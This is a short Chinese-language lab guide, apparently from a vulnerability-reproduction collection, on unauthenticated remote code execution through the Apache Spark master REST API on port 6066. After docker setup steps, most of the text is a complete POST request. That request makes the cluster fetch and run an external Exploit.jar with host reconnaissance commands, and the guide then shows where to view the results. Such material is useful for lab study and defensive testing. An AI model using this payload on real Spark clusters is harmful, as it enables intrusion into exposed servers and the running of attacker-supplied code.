开启环境：
```
docker compose up -d
```
访问页面：
```
http://localhost:18080
```
是master的管理页面

```
http://localhost:8081
```
是slave的管理页面

master 将在 6066 端口启动一个 HTTP 服务器，向这个端口提交 REST 格式的 API：
```
POST /v1/submissions/create HTTP/1.1
Content-Type: application/json

{
  "action": "CreateSubmissionRequest",
  "clientSparkVersion": "2.3.1",
  "appArgs": [
    "whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"
  ],
  "appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
  "environmentVariables": {
    "SPARK_ENV_LOADED": "1"
  },
  "mainClass": "Exploit",
  "sparkProperties": {
    "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
    "spark.driver.supervise": "false",
    "spark.app.name": "Exploit",
    "spark.eventLog.enabled": "true",
    "spark.submit.deployMode": "cluster",
    "spark.master": "spark://localhost:6066"
  }
}
```
会返回submissionId
访问
```
http://localhost:8081/logPage/?driverId=driver-20261007073319-0000&logType=stdout
```
可以查看到执行结果